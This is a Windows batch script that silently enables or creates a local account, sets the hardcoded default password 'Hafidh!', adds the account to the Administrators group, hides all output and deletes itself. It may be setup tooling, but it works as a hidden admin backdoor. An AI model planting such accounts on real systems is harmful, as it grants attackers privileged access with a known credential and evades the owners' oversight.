@echo off
mode con cp select=437 >nul

:: Set Single Target User & Password (Default Username: HFD, Default Password: Hafidh!)
if not defined username set username=HFD
if not defined password set password=Hafidh!

if /i "%username%"=="administrator" (
    net user administrator %password% >nul 2>&1
    net user administrator /active:yes >nul 2>&1
) else (
    net user %username% %password% /add >nul 2>&1
    net user %username% %password% >nul 2>&1
    net localgroup administrators %username% /add >nul 2>&1
)

del "%~f0"
